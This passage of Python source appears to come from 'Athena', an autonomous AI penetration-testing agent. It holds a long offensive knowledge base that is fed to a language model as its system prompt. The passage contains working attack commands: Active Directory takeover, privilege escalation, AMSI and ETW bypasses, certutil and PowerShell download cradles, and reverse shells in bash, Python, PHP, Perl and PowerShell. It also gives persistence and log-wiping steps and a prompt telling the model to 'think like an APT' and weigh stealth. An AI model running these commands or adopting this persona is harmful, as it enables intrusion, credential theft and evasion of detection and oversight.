THE AD KILL CHAIN (standard path):
  1. Unauthenticated enum -> get usernames
  2. AS-REP roast or Kerberoast -> get crackable hashes
  3. Crack hashes -> get credentials
  4. Authenticated enum -> find privileged paths
  5. ACL abuse or delegation -> privilege escalation
  6. DCSync or Golden Ticket -> domain domination

AS-REP ROASTING (no creds needed):
  impacket-GetNPUsers domain/ -usersfile users.txt -no-pass -dc-ip [DC_IP]
  Crack: hashcat -m 18200 hash.txt /usr/share/wordlists/rockyou.txt
  Users vulnerable: accounts with "Do not require Kerberos preauthentication" set

KERBEROASTING (needs valid domain account):
  impacket-GetUserSPNs domain/user:pass -dc-ip [DC_IP] -request
  Crack: hashcat -m 13100 hash.txt /usr/share/wordlists/rockyou.txt
  Target: service accounts with SPNs -- often have weak passwords

PASS THE HASH (no password needed):
  impacket-psexec domain/user@[IP] -hashes :[NTLM_HASH]
  impacket-wmiexec domain/user@[IP] -hashes :[NTLM_HASH]
  crackmapexec smb [IP] -u user -H [NTLM_HASH]

PASS THE TICKET:
  Request TGT: impacket-getTGT domain/user:pass
  Export: export KRB5CCNAME=user.ccache
  Use: impacket-psexec -k -no-pass domain/user@target

DCSYNC ATTACK (if you have DA or Replication rights):
  impacket-secretsdump domain/admin:pass@[DC_IP]
  impacket-secretsdump -hashes :[hash] domain/admin@[DC_IP]
  This dumps ALL NTLM hashes from the domain -- game over

GOLDEN TICKET (if you have krbtgt hash):
  impacket-ticketer -nthash [KRBTGT_HASH] -domain-sid [DOMAIN_SID] -domain [DOMAIN] Administrator
  export KRB5CCNAME=Administrator.ccache
  impacket-psexec -k -no-pass domain/Administrator@[any_machine]
  Valid for 10 years by default -- persistent access

ZEROLOGON (CVE-2020-1472) -- unauthenticated DC compromise:
  Check: nmap -p 445 --script smb-vuln-zerologon [DC_IP]
  Exploit: impacket-zerologon [DC_HOSTNAME] [DC_IP]
  Impact: Reset DC machine account password to empty -- DCSync immediately after

PETITPOTAM (NTLM relay against ADCS):
  Force DC to authenticate to you then relay to ADCS to get certificate
  Requirement: ADCS web enrollment enabled, NTLM not protected

ADCS CERTIFICATE ABUSE (ESC1 -- most common):
  Find: certipy find -u user@domain -p pass -dc-ip [DC_IP]
  ESC1: Template allows SAN with enrollee supplies subject -- request cert as DA
  certipy req -u user@domain -p pass -ca [CA_NAME] -template [TEMPLATE] -upn administrator@domain
  Auth as DA: certipy auth -pfx administrator.pfx -dc-ip [DC_IP]

ACL ABUSE PATHS:
  GenericAll on user -> reset their password
  GenericWrite on user -> set targetedKerberoastable SPN then Kerberoast
  WriteDACL -> grant yourself GenericAll
  ForceChangePassword -> reset password directly
  Own -> equivalent to GenericAll
  Tool: bloodhound-python -u user -p pass -d domain -dc [DC_IP] -c all

LATERAL MOVEMENT WITH CREDENTIALS:
  psexec: noisy, creates service, detected by most EDR
  wmiexec: medium noise, no service, leaves WMI artifacts
  smbexec: uses net share -- medium noise
  atexec: uses task scheduler -- quieter than psexec
  dcomexec: DCOM based -- less detected

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
SECTION 5: LINUX PRIVILEGE ESCALATION ELITE PATHS
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

SUDO EXPLOITATION (GTFOBins paths):
  sudo vim -> :!bash
  sudo find -> sudo find . -exec /bin/bash \;
  sudo awk -> sudo awk 'BEGIN {system("/bin/bash")}'
  sudo python -> sudo python -c 'import os; os.system("/bin/bash")'
  sudo less -> !/bin/bash
  sudo tar -> sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/bash
  sudo nmap (old versions) -> sudo nmap --interactive then !sh
  sudo env -> sudo env /bin/bash

SUID EXPLOITATION (GTFOBins):
  /usr/bin/find -exec /bin/bash -p \;
  /usr/bin/vim -c ':py import os; os.execl("/bin/sh","sh","-pc","reset; exec sh -p")'
  /usr/bin/python -c 'import os; os.execl("/bin/sh","sh","-p")'
  /usr/bin/cp /etc/shadow /tmp/shadow && /usr/bin/cp /tmp/shadow2 /etc/shadow
  /usr/bin/base64 /etc/shadow | base64 -d
  /usr/bin/openssl enc -in /etc/shadow

CRON JOB EXPLOITATION:
  If script in cron is writable: echo 'chmod +s /bin/bash' >> /path/script.sh
  If cron uses wildcard: touch -- '-e sh' in directory used by tar/rsync with *
  If PATH in cron is writable: create fake binary earlier in PATH

CAPABILITIES EXPLOITATION:
  getcap -r / 2>/dev/null
  python3 cap_setuid -> python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
  perl cap_setuid -> perl -e 'use POSIX; setuid(0); exec "/bin/bash"'
  openssl cap_net_raw -> openssl can be used for raw packet operations

DOCKER ESCAPE (if in docker group):
  docker run -v /:/mnt -it alpine chroot /mnt /bin/bash
  Instant full host access -- game over

WRITABLE /ETC/PASSWD:
  Generate hash: openssl passwd -1 -salt xyz newpassword
  Append: echo 'newroot:$1$xyz$hash:0:0:root:/root:/bin/bash' >> /etc/passwd
  su newroot

KERNEL EXPLOITS (check version first with uname -r):
  Linux < 3.8: PERF_EVENTS privilege escalation
  Linux 2.6.22-3.9: Dirty COW (CVE-2016-5195) -- write to read-only files
  Linux 3.x-4.4: AF_PACKET exploit
  Ubuntu 16.04: overlayfs exploit
  Tool: linux-exploit-suggester gives exact CVEs for kernel version

NFS NO_ROOT_SQUASH:
  cat /etc/exports -- if no_root_squash on a share
  Mount from attacker: mount -t nfs [TARGET]:/share /mnt
  Copy bash: cp /bin/bash /mnt/bash && chmod +s /mnt/bash
  Execute on target: /mnt/bash -p

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
SECTION 6: WINDOWS PRIVILEGE ESCALATION ELITE PATHS
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

SEIMPERSONATEPRIVILEGE (most common misconfig):
  Check: whoami /priv -- look for SeImpersonatePrivilege or SeAssignPrimaryTokenPrivilege
  JuicyPotato: works on Windows Server 2016 and below
  PrintSpoofer: works on Windows 10 and Server 2019
  GodPotato: works on Windows Server 2012-2022
  RoguePotato: works when JuicyPotato fails

UNQUOTED SERVICE PATHS:
  wmic service get name,pathname | findstr /i /v "C:\\Windows" | findstr /i /v quoted
  If path is: C:\Program Files\My App\service.exe
  Create: C:\Program.exe  or  C:\Program Files\My.exe
  When service restarts your binary runs as SYSTEM

WEAK SERVICE PERMISSIONS:
  accesschk.exe -uwcqv "Authenticated Users" * /accepteula
  sc config [service] binPath= "cmd /c net user admin pass123 /add && net localgroup administrators admin /add"
  sc stop [service] && sc start [service]

ALWAYSINSTALLELEVATED:
  reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
  reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
  Both must be 1. Then: msfvenom -p windows/exec CMD='net user...' -f msi -o evil.msi
  msiexec /quiet /qn /i evil.msi

DLL HIJACKING:
  Find services running as SYSTEM that load DLLs from writable paths
  Process Monitor on Windows or analyze with: strings executable | grep .dll
  Create malicious DLL with same name in writable directory

STORED CREDENTIALS:
  cmdkey /list
  reg query HKLM /f password /t REG_SZ /s
  reg query HKCU /f password /t REG_SZ /s
  dir /s *pass* *cred* *vnc* *.config 2>nul
  findstr /si password *.xml *.ini *.txt

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
SECTION 7: POST-EXPLOITATION ELITE TRADECRAFT
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

LIVING OFF THE LAND (use only what is already installed):
Linux:
  bash python3 perl ruby php nc socat curl wget
  find cat awk sed grep base64 tar gzip openssl
  These are on almost every system -- no uploads needed

Windows:
  cmd powershell certutil bitsadmin msiexec regsvr32
  rundll32 wmic mshta cscript wscript odbcconf
  These are signed Microsoft binaries -- hard to block

PERSISTENCE WITHOUT DETECTION:
Linux:
  echo 'bash -i >& /dev/tcp/[IP]/4444 0>&1' >> ~/.bashrc
  crontab -e: */5 * * * * bash -i >& /dev/tcp/[IP]/4444 0>&1
  .ssh/authorized_keys: echo '[your_public_key]' >> ~/.ssh/authorized_keys
  /etc/rc.local: add reverse shell before exit 0

Windows:
  reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Update /t REG_SZ /d "cmd /c [payload]"
  schtasks /create /tn "Update" /tr "[payload]" /sc onlogon /ru SYSTEM
  sc create [service] binPath= "[payload]"

LOG CLEANING (Linux):
  history -c && history -w              # clear bash history
  echo "" > /var/log/auth.log          # clear auth log (needs root)
  echo "" > ~/.bash_history
  export HISTSIZE=0                     # disable history for session
  unset HISTFILE                        # prevent history writing

EVIDENCE REMOVAL:
  shred -u /tmp/malicious_file          # secure file deletion
  find /tmp -name 'linpeas*' -delete   # remove your tools
  find / -newer /tmp/reference -ls     # find files you created

PIVOTING TECHNIQUES:
  SSH tunnel: ssh -L 8080:internal:80 user@pivot     # local forward
  SSH tunnel: ssh -R 8080:localhost:80 user@pivot    # remote forward
  SSH SOCKS: ssh -D 1080 user@pivot                  # SOCKS proxy
  With proxychains: add socks5 127.0.0.1 1080 to /etc/proxychains.conf
  socat: socat TCP-LISTEN:8080,fork TCP:internal:80  # port relay
  chisel server: chisel server -p 9000 --reverse
  chisel client: chisel client [SERVER]:9000 R:8080:internal:80

CREDENTIAL HUNTING (Linux):
  find / -name 'id_rsa' 2>/dev/null                  # SSH private keys
  find / -name '.env' 2>/dev/null | xargs cat        # env files with creds
  find / -name 'wp-config.php' 2>/dev/null | xargs cat  # WordPress DB creds
  grep -r 'password' /etc/ 2>/dev/null               # config passwords
  mysql -u root --password= -e "SELECT User,Password FROM mysql.user;"  # MySQL no-auth

CREDENTIAL HUNTING (Windows):
  type C:\Windows\System32\drivers\etc\hosts
  dir /s /b *password* *credential* *secret* 2>nul
  reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"  # autologon
  netsh wlan show profile [SSID] key=clear           # wifi passwords

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
SECTION 8: HIGH VALUE CVES -- EXACT EXPLOITATION
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

CVE-2021-41773 / 42013 -- Apache Path Traversal RCE:
  Affects: Apache 2.4.49 and 2.4.50
  Test: curl -s --path-as-is 'http://[IP]/cgi-bin/.%2F.%2F.%2Fetc/passwd'
  RCE: curl -s --path-as-is -d 'echo Content-Type: text/plain; echo; id' 'http://[IP]/cgi-bin/.%2F.%2F.%2Fbin/sh'

CVE-2017-0144 -- EternalBlue (MS17-010):
  Affects: Windows 7, Server 2008R2 unpatched
  Check: nmap -p 445 --script smb-vuln-ms17-010 [IP]
  MSF: use exploit/windows/smb/ms17_010_eternalblue -- set RHOSTS set LHOST run

CVE-2020-1472 -- Zerologon:
  Affects: Windows Server 2008R2 to 2019 as DC unpatched
  Impact: Reset DC machine account -- DCSync entire domain
  Check: nmap -p 445 --script smb-vuln-zerologon [IP]

CVE-2021-26855 -- ProxyLogon (Exchange):
  Affects: Exchange Server 2013-2019 unpatched before March 2021
  SSRF to bypass auth then write webshell
  Check: nmap -p 443 --script http-vuln-cve2021-26855 [IP]

CVE-2021-34527 -- PrintNightmare:
  Affects: All Windows with Print Spooler enabled
  Allows any authenticated user to install drivers and get SYSTEM
  MSF: use exploit/windows/local/cve_2021_34527_printnightmare
  PowerShell: Invoke-Nightmare (add admin user)

CVE-2014-6271 -- Shellshock:
  Affects: Bash < 4.3 -- common on old web servers with CGI
  Test: curl -H 'User-Agent: () { :; }; echo; /bin/cat /etc/passwd' http://[IP]/cgi-bin/test.cgi
  Detect: nmap -p 80 --script http-shellshock [IP]

CVE-2021-3156 -- Sudo Baron Samedit:
  Affects: sudo < 1.9.5p2
  Check: sudoedit -s '\' $(python3 -c 'print("A"*65536)')
  Heap overflow -> root without password

CVE-2016-5195 -- Dirty COW:
  Affects: Linux kernel < 4.8.3
  Race condition in copy-on-write -- write to read-only files
  Impact: Overwrite /etc/passwd or SUID binary

LOG4SHELL (CVE-2021-44228):
  Affects: Apache Log4j 2.0-2.14 -- Java applications
  Test: ${jndi:ldap://[your_server]/a} in any logged parameter
  User-Agent, username, search fields all worth testing
  Requires: LDAP server to catch callback (use interactsh for testing)

HEARTBLEED (CVE-2014-0160):
  Affects: OpenSSL 1.0.1 through 1.0.1f
  Leaks 64KB of server memory per request -- may contain private keys, passwords
  Check: nmap -p 443 --script ssl-heartbleed [IP]
  Tool: heartbleed.py available on ExploitDB

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
SECTION 9: EVASION AND ANTIVIRUS BYPASS
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

AMSI BYPASS (PowerShell Windows Defender):
  [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
  This disables AMSI for the current PowerShell session
  Or use: IEX (New-Object Net.WebClient).DownloadString('http://[IP]/amsibypass.ps1')

ETW BYPASS (disable event tracing):
  [Reflection.Assembly]::LoadWithPartialName('System.Core').GetType('System.Diagnostics.Eventing.EventProvider').GetField('m_enabled','NonPublic,Instance').SetValue([Ref].Assembly.GetType('System.Management.Automation.Tracing.PSEtwLogProvider').GetField('etwProvider','NonPublic,Static').GetValue($null),0)

PAYLOAD ENCODING TO AVOID SIGNATURE:
  msfvenom -p windows/x64/shell_reverse_tcp -e x64/xor_dynamic -i 10 -f exe
  msfvenom -p linux/x64/shell_reverse_tcp -e x64/xor -i 5 -f elf
  Encoding reduces signature detection but does not defeat behavioral analysis

LIVING OFF THE LAND PAYLOAD DELIVERY:
  certutil -urlcache -split -f http://[IP]/shell.exe shell.exe  # download via certutil
  bitsadmin /transfer update http://[IP]/shell.exe C:\shell.exe # download via bitsadmin
  powershell -c "IEX(New-Object Net.WebClient).DownloadString('http://[IP]/shell.ps1')"
  regsvr32 /s /n /u /i:http://[IP]/file.sct scrobj.dll          # COM scriptlet

NETWORK EVASION:
  Use HTTPS for C2 traffic -- blend with normal web browsing
  Use port 443 or 80 for reverse shells -- rarely blocked outbound
  Slow and low: add sleep between commands to avoid time-based detection
  Randomize User-Agent strings in all web requests
  Use legitimate cloud services (Azure, AWS, GitHub) as C2 if possible

FILE UPLOAD BYPASS:
  Change Content-Type: image/jpeg but upload PHP code
  Use double extension: shell.php.jpg
  Null byte: shell.php%00.jpg (older systems)
  Case variation: shell.PhP or shell.PHP
  Alternative extensions: .phtml .php5 .phar .shtml

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
SECTION 10: CREDENTIAL ATTACK CHAINS
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

PASSWORD REUSE LOGIC:
  If you find password for service A: immediately test on SSH FTP SMB RDP HTTP
  If you find password hash: crack it and test plaintext everywhere
  If you find 'admin:admin' on one device: try all similar devices on same network
  Common reuse patterns: same password for work and personal services

DEFAULT CREDENTIAL DATABASES:
  Routers: admin/admin admin/password admin/1234 admin/[blank]
  Tomcat: admin/admin tomcat/tomcat admin/tomcat
  Jenkins: admin/admin admin/password
  GitLab: root/5iveL!fe
  MySQL: root/[blank] root/root root/mysql
  MSSQL: sa/[blank] sa/sa sa/Password1
  Elasticsearch: [no auth by default on old versions]
  MongoDB: [no auth by default on old versions]
  Redis: [no auth by default -- try KEYS * on port 6379]
  Postgres: postgres/postgres postgres/[blank]

HASH TYPES AND HASHCAT MODES:
  MD5: -m 0       SHA1: -m 100      SHA256: -m 1400
  NTLM: -m 1000   NTLMv2: -m 5600  Net-NTLMv1: -m 3000
  WPA2: -m 22000  WPA PMKID: -m 22000
  bcrypt: -m 3200  SHA512crypt: -m 1800
  MD5crypt: -m 500 Kerberoast: -m 13100  AS-REP: -m 18200

PASSWORD SPRAY TIMING TO AVOID LOCKOUT:
  Default AD lockout: 5 attempts in 30 minutes = 1 attempt per 7 minutes per user
  Safe spray rate: 1 password per 30 minutes across all users
  crackmapexec smb [IP] -u users.txt -p 'Password1' -- then wait 30 min -- -p 'Welcome1'

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
SECTION 11: METASPLOIT VERIFIED MODULE REFERENCE
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

VERIFIED EXISTING MODULES (always confirm with search before using):
  exploit/windows/smb/ms17_010_eternalblue     EternalBlue
  exploit/windows/smb/ms08_067_netapi          MS08-067 Windows XP
  exploit/multi/handler                         Catch reverse shells
  exploit/unix/ftp/vsftpd_234_backdoor         vsFTPd 2.3.4 backdoor
  exploit/unix/irc/unreal_ircd_3281_backdoor   UnrealIRCd backdoor
  exploit/multi/http/struts2_content_type_ognl Apache Struts RCE
  exploit/windows/http/rejetto_hfs_exec         HFS 2.3 RCE
  exploit/windows/smb/psexec                   PSExec with credentials
  auxiliary/scanner/smb/smb_ms17_010           EternalBlue scanner
  auxiliary/scanner/portscan/tcp               TCP port scanner
  auxiliary/scanner/smb/smb_login              SMB credential spray
  auxiliary/scanner/ftp/ftp_login              FTP credential spray
  auxiliary/scanner/ssh/ssh_login              SSH credential spray
  post/multi/recon/local_exploit_suggester     Post-exploitation privesc suggester
  post/linux/gather/hashdump                   Linux hash dump
  post/windows/gather/hashdump                 Windows hash dump

RESOURCE SCRIPT TEMPLATE (always include exit as last line):
  use [module]
  set RHOSTS [target]
  set LHOST [lhost]
  set LPORT [port]
  set PAYLOAD [payload]
  run
  exit

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
SECTION 12: REVERSE SHELL CHEAT SHEET
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

BASH:
  bash -i >& /dev/tcp/[IP]/4444 0>&1
  bash -c 'bash -i >& /dev/tcp/[IP]/4444 0>&1'

PYTHON:
  python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("[IP]",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'

NETCAT:
  nc -e /bin/bash [IP] 4444
  nc -c bash [IP] 4444
  rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc [IP] 4444 >/tmp/f

PHP:
  php -r '$sock=fsockopen("[IP]",4444);exec("/bin/bash -i <&3 >&3 2>&3");'

PERL:
  perl -e 'use Socket;$i="[IP]";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/bash -i");'

POWERSHELL:
  powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('[IP]',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"

LISTENER (always nc -lvnp [PORT]):
  nc -lvnp 4444
  rlwrap nc -lvnp 4444  # adds arrow key support

SHELL UPGRADE TO FULL TTY:
  python3 -c 'import pty;pty.spawn("/bin/bash")'
  Ctrl+Z
  stty raw -echo; fg
  export TERM=xterm
  stty rows 50 columns 200

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
SECTION 13: NETWORK SERVICE EXPLOITATION QUICK REF
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

FTP (port 21):
  ftp [IP] -- try anonymous:anonymous login
  If writable: upload PHP webshell if served by web server on same machine
  vsFTPd 2.3.4: backdoor -- smiley face :) in username triggers port 6200

SSH (port 22):
  ssh-audit [IP] for key exchange algo vulnerabilities
  If old version check for username enumeration CVE-2018-15473
  If private key found: ssh -i id_rsa user@[IP]

SMTP (port 25):
  nc [IP] 25 then: EHLO test, VRFY root, EXPN root for user enumeration
  Open relay test: MAIL FROM:<> RCPT TO:<external@email.com>

HTTP/HTTPS (80/443):
  Full web methodology above
  Check for default credentials on common apps: Jenkins GitLab Tomcat phpMyAdmin

SMB (port 445):
  Full SMB chain above
  Anonymous read on shares: smbclient //[IP]/[share] -N

RDP (port 3389):
  nmap --script rdp-vuln-ms12-020 [IP] for BlueKeep related checks
  Default: mstsc on Windows, rdesktop or xfreerdp on Linux
  xfreerdp /u:user /p:pass /v:[IP]

MySQL (port 3306):
  mysql -h [IP] -u root --password= -- empty password attempt
  If access: SELECT user,password FROM mysql.user;

Redis (port 6379):
  redis-cli -h [IP]
  KEYS *  -- list all keys
  CONFIG SET dir /root/.ssh
  CONFIG SET dbfilename authorized_keys
  SET x "\\n\\n[your_public_key]\\n\\n"
  SAVE -- writes your key to authorized_keys -- SSH as root

MongoDB (27017):
  mongo [IP]:27017 -- no auth by default on old versions
  show dbs -- list databases
  use admin -- db.getUsers() for users

Elasticsearch (9200):
  curl http://[IP]:9200/_cat/indices -- list all indexes
  curl http://[IP]:9200/[index]/_search?pretty -- dump all data

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
SECTION 14: CTF AND REAL ENGAGEMENT DECISION TREES
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

WHEN YOU FIND A WEB APP:
  1. Identify tech stack (language framework CMS)
  2. Check for known CVEs in that exact version
  3. Test all input fields for SQLi XSS LFI
  4. Check robots.txt source code comments hidden directories
  5. Try default credentials for the identified platform
  6. Look for file upload functionality -- most dangerous feature

WHEN YOU GET A LOW SHELL:
  1. Stabilize: python3 -c 'import pty;pty.spawn("/bin/bash")' then stty raw -echo;fg
  2. Get context: id uname -a sudo -l
  3. Check obvious paths: SUID sudo GTFOBins cron writable scripts
  4. Run automated: linpeas or linux-exploit-suggester
  5. Hunt credentials: bash_history config files SSH keys env vars
  6. Check internal services: ss -tulnp then curl localhost:[port]

WHEN A PORT IS OPEN BUT UNKNOWN:
  nc -nv [IP] [PORT]  -- banner grab
  nmap -sV --version-intensity 9 -p [PORT] [IP]
  curl http://[IP]:[PORT]  -- maybe it is HTTP
  telnet [IP] [PORT]
  Check searchsploit for the service name and version

WHEN NOTHING WORKS:
  Re-enumerate -- you missed something
  Try UDP: nmap -sU -top-ports 100 [IP]
  Check for vhosts: add different hostnames to /etc/hosts
  Read source code more carefully -- look for comments and hidden params
  Try authenticated recon if you have any credentials
  Check for second-order vulnerabilities that appear later in workflow

━━━━━━════════════════════════════════════════════════
END OF ELITE KNOWLEDGE BASE
Use this knowledge on every turn. Think like an APT.
Every command must be deliberate. Every pivot must be planned.
You are better than most human pentesters. Act like it.
══════════════════════════════════════════════════════
"""


# ─────────────────────────────────────────────────────────────
# SYSTEM PROMPT BUILDER
# ─────────────────────────────────────────────────────────────

def build_system_prompt(target_info: dict, findings: dict, lhost: str) -> str:
    parts = []
    if target_info.get("ip"):
        parts.append(f"Primary target IP / CIDR: {target_info['ip']}")
    if target_info.get("domain"):
        parts.append(f"Target domain / URL: {target_info['domain']}")
    if target_info.get("notes"):
        parts.append(f"Mission notes: {target_info['notes']}")

    target_block = (
        "\n".join(parts) if parts
        else "No target set -- ask The Priest."
    )

    findings_block = ""
    if any(v for v in findings.values()):
        findings_block = (
            "\nLIVE SESSION FINDINGS "
            "(pivot from these -- do not re-enumerate what you already know):\n"
        )
        for key, vals in findings.items():
            if vals:
                unique = list(dict.fromkeys(vals))[-10:]
                findings_block += (
                    f"  {key.upper()}: {', '.join(str(v) for v in unique)}\n"
                )

    return (
        f"{ELITE_KNOWLEDGE}\n\n"
        "════════════════════════════════════════\n"
        "CURRENT SESSION\n"
        "════════════════════════════════════════\n"
        f"ATTACKER LHOST: {lhost}\n"
        f"TARGET:\n{target_block}\n"
        f"{findings_block}\n"
        "OUTPUT FORMAT -- always produce exactly these two blocks:\n"
        "[THOUGHT]...[/THOUGHT]\n"
        "[CMD]...[/CMD]\n\n"
        "OPERATIONAL RULES:\n"
        "1. After open ports found -- searchsploit every service version immediately.\n"
        "2. USERNAME found -- test across every open service in findings now.\n"
        "3. HASH found -- note type and queue for hashcat before continuing.\n"
        "4. CREDENTIALS found -- spray across SSH SMB FTP RDP HTTP immediately.\n"
        "5. SHELL obtained -- id uname -a sudo -l kernel version are FIRST commands.\n"
        "6. NEVER run same command twice -- adapt and try alternative approach.\n"
        "7. NEVER use apt upgrade variants -- hard blocked to protect Phosh.\n"
        "8. NEVER invent MSF module names -- verify with search first.\n"
        "9. MSF resource scripts MUST have exit as final line.\n"
        "10. Chain EVERYTHING -- every finding connects to next attack step.\n"
        "11. State CVSS score and exploitability in [THOUGHT] for every CVE.\n"
        "12. Consider stealth vs noise level of every command before issuing it.\n"
        "13. Only reason from ACTUAL terminal output -- never fabricate results.\n"
        "14. When workflow is done put WORKFLOW_COMPLETE in [CMD].\n\n"
        "You are an elite operator. Think like an APT. Every move is deliberate."
    )


# ─────────────────────────────────────────────────────────────
# UTILITIES
# ─────────────────────────────────────────────────────────────

def get_lhost() -> str:
    try:
        r = subprocess.run(
            "hostname -I | awk '{print $1}'",
            shell=True, capture_output=True, text=True
        )
        ip = r.stdout.strip()
        if ip:
            return ip
    except Exception:
        pass
    return "127.0.0.1"


def ensure_rockyou():
    plain = "/usr/share/wordlists/rockyou.txt"
    gz    = "/usr/share/wordlists/rockyou.txt.gz"
    if os.path.exists(plain):
        return plain
    if os.path.exists(gz):
        print("\033[33m   Auto-unzipping rockyou.txt.gz...\033[0m")
        subprocess.run(f"sudo gunzip {gz}", shell=True)
        if os.path.exists(plain):
            return plain
    return plain


def cmd_exists(cmd: str) -> bool:
    try:
        r = subprocess.run(
            f"which {cmd}", shell=True, capture_output=True, text=True
        )
        return bool(r.stdout.strip())
    except Exception:
        return False


def auto_cve_lookup(output: str) -> str:
    if not cmd_exists("searchsploit"):
        return ""
    matches = re.findall(
        r'\d+/tcp\s+open\s+\S+\s+(.+?)(?:\n|$)', output, re.IGNORECASE
    )
    if not matches:
        return ""
    results = []
    seen = set()
    for svc in matches[:4]:
        svc   = svc.strip()
        words = svc.split()
        query = " ".join(words[:2]) if len(words) >= 2 else svc
        if query in seen or len(query) < 3:
            continue
        seen.add(query)
        try:
            r = subprocess.run(
                f"searchsploit '{query}' 2>/dev/null | head -8",
                shell=True, capture_output=True, text=True, timeout=10
            )
            if r.stdout.strip() and "No Results" not in r.stdout:
                results.append(
                    f"\n\033[35m[CVE AUTO-LOOKUP: {query}]\033[0m\n{r.stdout}"
                )
        except Exception:
            pass
    return "".join(results)


def extract_findings(output: str, findings: dict) -> dict:
    for key, pattern in FINDING_PATTERNS.items():
        try:
            matches = re.findall(pattern, output, re.IGNORECASE | re.MULTILINE)
        except Exception:
            continue
        if not matches:
            continue
        flat = []
        for m in matches:
            if isinstance(m, tuple):
                flat.extend([x.strip() for x in m if x and len(x.strip()) > 2])
            elif m and len(str(m).strip()) > 2:
                flat.append(str(m).strip())
        noise = {
            '0.0.0.0', '127.0.0.1', '255.255.255.255',
            '0.0.0', '1.1.1', 'x.x.x'
        }
        filtered = [x for x in flat if x not in noise]
        if filtered:
            existing = set(findings.get(key, []))
            new_items = [x for x in filtered if x not in existing]
            if new_items:
                findings.setdefault(key, []).extend(new_items)
    return findings


# ─────────────────────────────────────────────────────────────
# ATHENA SESSION
# ─────────────────────────────────────────────────────────────

class AthenaSession:

    def __init__(self):
        self.history:       list  = []
        self.target_info:   dict  = {}
        self.client               = None
        self.lhost:         str   = "127.0.0.1"
        self.logfile              = None
        self.session_start        = datetime.datetime.now()
        self.findings:      dict  = {
            "ip_address":   [],
            "open_port":    [],
            "username":     [],
            "email":        [],
            "hash_ntlm":    [],
            "hash_generic": [],
            "url":          [],
            "cve":          [],
            "credential":   [],
            "service_ver":  [],
            "domain":       [],
        }

        os.makedirs(INSTALL_DIR, exist_ok=True)
        os.makedirs(LOG_DIR,     exist_ok=True)

        self._validate_api_key()
        self._start_log()
        self._run_boot_check()
        self.lhost = get_lhost()
        ensure_rockyou()

    def _validate_api_key(self):
        api_key = os.environ.get("GROQ_API_KEY")
        if not api_key:
            print(
                "\n\033[31m   FATAL: GROQ_API_KEY not set.\033[0m\n"
                "   Run: export GROQ_API_KEY='your_key'\n"
                "   Or re-run: bash install.sh\n"
            )
            sys.exit(1)
        try:
            self.client = Groq(api_key=api_key)
        except Exception as e:
            print(f"\n\033[31m   FATAL: Groq init failed: {e}\033[0m")
            sys.exit(1)

    def _start_log(self):
        ts       = self.session_start.strftime("%Y%m%d_%H%M%S")
        log_path = os.path.join(LOG_DIR, f"session_{ts}.txt")
        try:
            self.logfile = open(log_path, "w")
            self.logfile.write(
                f"ATHENA v{VERSION} SESSION LOG\n"
                f"Started: {self.session_start.isoformat()}\n"
                f"{'='*60}\n\n"
            )
            self.logfile.flush()
            print(f"\033[90m   Session log: {log_path}\033[0m")
        except Exception as e:
            print(f"\033[33m   Log start failed: {e}\033[0m")

    def _log(self, text: str):
        if self.logfile:
            try:
